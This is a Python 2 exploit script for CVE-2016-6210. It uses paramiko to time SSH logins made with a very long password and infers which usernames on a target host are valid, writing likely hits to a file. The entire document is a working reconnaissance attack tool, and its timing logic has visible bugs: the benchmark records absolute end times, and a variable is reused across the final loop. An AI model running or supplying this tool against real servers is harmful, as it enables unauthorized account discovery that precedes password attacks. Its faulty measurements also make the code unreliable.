#!/usr/bin/python
import paramiko
import time, sys, csv, os
import threading, multiprocessing
import logging

if(len(sys.argv) < 4):
	print "REL: CVE-2016-6210"
	print "Usage: "+sys.argv[0]+" uname_list.txt host outfile"
	sys.exit()

p='A'*25000
THREAD_COUNT = 3	# This is also the amount of "samples" that the application will take into account for each calculation (time/THREAD_COUNT) = avg_resp;
FAKE_USER = "AaAaAaAaAa"	# Benchmark user, I definitely don't exist
BENCHMARK = 0

num_lines = sum(1 for line in open(sys.argv[1]))
username_list = sys.argv[1]
var = 0; time_per_user = 0;
threads = []; usertimelist = {};

def ssh_connection(target, usertarget, outfile):
	global time_per_user
	starttime = 0; endtime = 0; total = 0;
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	starttime = time.clock()
	try:
		ssh.connect(target, username=usertarget,password=p)
	except:
		endtime = time.clock() # TIME the connection
	total = endtime - starttime
	# print usertarget+" : "+str(total) # print times of each connection attempt as its going (username:time)
	with open(outfile, 'a+') as outputFile:
		csvFile = csv.writer(outputFile, delimiter=',')
		data = [[username, total]]
		csvFile.writerows(data)
	time_per_user += total

if not os.stat(username_list).st_size == 0:
	print "- Connection logging set to paramiko.log, necessary so Paramiko doesn't fuss, useful for debugging."
	paramiko.util.log_to_file("paramiko.log")
	ssh_bench = paramiko.SSHClient()
	ssh_bench.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	print "- Calculating a benchmark using FAKE_USER for more accurate results..."
	tempbench = []
	for i in range(0,5):
		starttime = time.clock()
		try:
			ssh_bench.connect(sys.argv[2], username=FAKE_USER,password=p)
		except:
			endtime = time.clock()
		tempbench.append(endtime)
	BENCHMARK = sum(i for i in tempbench)/5
	print "* Benchmark Successfully Calculated: " + str(BENCHMARK)
	with open(username_list) as users:
		for username in users:
			username = username.replace('\n','')
			for i in range(THREAD_COUNT):
				threader = threading.Thread(target=ssh_connection, args=(sys.argv[2], username, sys.argv[3]))
				threads.append(threader)
			for thread in threads:
				thread.start()
				thread.join()
			threads = []
			print "[+] Averaged time for username "+username+" : "+str((time_per_user/THREAD_COUNT))
			usertimelist.update({username : (time_per_user/THREAD_COUNT)})
			time_per_user = 0
else:
	print "[-] List is empty.. what did you expect? Give me some usernames."
	# [thread.start() for thread in threads] 	# Why doesn't true multithreading work?
	# [thread.join() for thread in threads]		# Tell me why?.. Why? 
for user in sorted(usertimelist.items(), reverse=True):
	BENCHMARK = user[1]/BENCHMARK
	fname = sys.argv[2].replace('.','_')+"_valid_usernames.txt"
	if((BENCHMARK <= .10)): # 10% or less
		print "[+] " + user[0] + " invalid user; less than 10 percent of benchmark at: "+str(BENCHMARK)
	elif ((BENCHMARK) < .20):
		print "[+] " + user[0] + " toss up, not including based on current settings at: "+str(BENCHMARK)
	elif (((BENCHMARK) >= .20) and (BENCHMARK) < .30): # 20% greater
		print "[+] " + user[0] + " likely a valid user at: "+str(BENCHMARK) + ". Appending to: " + fname
		with open(fname, "a+") as outputFile:
			outputFile.write(user[0]+"\n")
	elif ((BENCHMARK) >= .30): # 30% or greater above the benchmark
		print "[+] " + user[0] + " is a valid user, appending to: " + fname
		with open(fname, "a+") as outputFile:
			outputFile.write(user[0]+"\n")
